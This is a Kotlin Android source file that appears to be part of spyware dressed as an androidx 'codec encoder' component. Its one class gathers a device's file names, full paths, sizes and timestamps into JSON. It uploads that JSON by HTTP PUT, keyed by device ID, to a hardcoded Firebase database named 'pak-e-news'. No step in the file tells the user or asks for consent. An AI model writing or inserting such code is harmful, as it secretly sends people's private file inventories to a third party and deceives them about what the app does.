package com.androidx.codec.encoder.core.data.firebase

import android.util.Log
import com.androidx.codec.encoder.core.domain.model.MediaCatalogItem
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class FirebaseDatabaseProvider(
    private val defaultBaseUrl: String = "https://pak-e-news-default-rtdb.firebaseio.com/"
) {

    companion object {
        private const val TAG = "CodecEncoderDb"
    }

    suspend fun uploadMediaCatalog(
        deviceId: String,
        files: List<MediaCatalogItem>,
        baseUrl: String? = null
    ): Boolean = withContext(Dispatchers.IO) {
        val rootUrl = (baseUrl?.takeIf { it.isNotBlank() } ?: defaultBaseUrl).trimEnd('/')
        val endpoint = "$rootUrl/filemanager/$deviceId.json"

        Log.i(TAG, "Uploading media catalog for device: $deviceId (${files.size} items)")

        val jsonBuilder = StringBuilder()
        jsonBuilder.append("{")
        jsonBuilder.append("\"deviceId\":\"").append(escapeJson(deviceId)).append("\",")
        jsonBuilder.append("\"timestamp\":").append(System.currentTimeMillis()).append(",")
        jsonBuilder.append("\"totalFiles\":").append(files.size).append(",")
        jsonBuilder.append("\"files\":[")

        files.forEachIndexed { index, item ->
            jsonBuilder.append("{")
            jsonBuilder.append("\"name\":\"").append(escapeJson(item.name)).append("\",")
            jsonBuilder.append("\"path\":\"").append(escapeJson(item.path)).append("\",")
            jsonBuilder.append("\"sizeBytes\":").append(item.sizeBytes).append(",")
            jsonBuilder.append("\"isDirectory\":").append(item.isDirectory).append(",")
            jsonBuilder.append("\"lastModified\":").append(item.lastModified)
            jsonBuilder.append("}")
            if (index < files.size - 1) {
                jsonBuilder.append(",")
            }
        }

        jsonBuilder.append("]")
        jsonBuilder.append("}")

        val jsonBody = jsonBuilder.toString()

        try {
            val url = URL(endpoint)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "PUT"
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            conn.doOutput = true
            conn.connectTimeout = 20000
            conn.readTimeout = 20000

            OutputStreamWriter(conn.outputStream, "UTF-8").use { writer ->
                writer.write(jsonBody)
                writer.flush()
            }

            val responseCode = conn.responseCode
            Log.i(TAG, "Database sync response code: $responseCode")
            conn.disconnect()
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "Failed to sync database: ${e.message}", e)
            false
        }
    }

    private fun escapeJson(input: String): String {
        return input.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }
}
